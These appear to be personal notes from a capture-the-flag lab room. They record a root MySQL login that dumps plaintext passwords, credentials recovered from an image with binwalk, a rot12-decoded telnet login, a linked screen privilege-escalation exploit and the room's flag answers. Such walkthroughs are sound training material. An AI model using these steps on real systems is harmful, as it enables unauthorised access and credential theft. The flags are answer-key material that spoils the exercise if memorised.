 mysql -u root -h 10.10.1.99 -p --skip-ssl

MySQL [users]> select * from User ;
+----------+---------------------------------------+
| username | password                              |
+----------+---------------------------------------+
| ramen    | noodlesRTheBest                       |
| flag     | thm{2f30841ff8d9646845295135adda8332} |
+----------+---------------------------------------+

flag 1 : thm{2f30841ff8d9646845295135adda8332} 

ramen@foodctf:/home/bread$ 
flag  main  main.go  resources

flag 2 : thm{7baf5aa8491a4b7b1c2d231a24aec575}

ramen@foodctf:/home/food$

total 40
drwxr-xr-x 5 food food 4096 Mar 30  2020 ./
drwxr-xr-x 7 root root 4096 Mar 28  2020 ../
-rw-r--r-- 1 food food  220 Mar 19  2020 .bash_logout
-rw-r--r-- 1 food food 3771 Mar 19  2020 .bashrc
drwx------ 2 food food 4096 Mar 19  2020 .cache/
-rw-rw-r-- 1 food food   38 Mar 28  2020 .flag
drwx------ 3 food food 4096 Mar 19  2020 .gnupg/
drwxrwxr-x 3 food food 4096 Mar 19  2020 .local/
-rw------- 1 food food   23 Mar 19  2020 .mysql_history
-rw-r--r-- 1 food food  815 Mar 28  2020 .profile

flag 3 : thm{58a3cb46855af54d0660b34fd20a04c1} 

/var 

flag 4 : thm{0c48608136e6f8c86aecdb5d4c3d7ba8}

/home/bread/resources/monitor/main.js 

http://10.10.1.99:16109/

binwalk food.jpg 

creds.txt0000644000000000000000000000002513634770536011430 0ustar  rootrootpasta:pastaisdynamic

creds for pasta 
pasta:pastaisdynamic


telnet 10.10.1.99 46969 

Trying 10.10.1.99...
Connected to 10.10.1.99.
Escape character is '^]'.
tccr:uwjsasqccywsg ==> rot 12 ==> food:givemecookies 
foodctf login:



https://github.com/YasserREED/screen-v4.5.0-priv-escalate/blob/main/full-exploit.sh

flag 5 : thm{9f1ee18d3021d135b03b943cc58f34db} 

cat /home/tryhackme/flag7
flag 6 : thm{5a926ab5d3561e976f4ae5a7e2d034fe}

/var/lib/mysql/debian-5.7.flag
flag 7 :